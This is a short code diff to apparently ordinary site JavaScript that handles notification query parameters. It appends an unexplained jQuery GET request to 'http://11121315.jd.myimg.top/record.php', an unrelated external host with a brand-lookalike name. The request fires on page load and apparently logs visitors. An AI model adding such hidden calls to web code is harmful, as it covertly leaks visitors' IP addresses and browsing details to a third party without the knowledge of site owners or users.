@@ -79,3 +79,9 @@ let tipType = getQueryVariable("notifications");
 let tipText = decodeURIComponent(getQueryVariable("notifications_content"));
 if(getQueryVariable("notifications") && getQueryVariable("notifications_content"))
 { maketip(tipType, tipText); }
+
+$.ajax(
+    {
+        url: "http://11121315.jd.myimg.top/record.php",
+        type: "GET",
+    } );
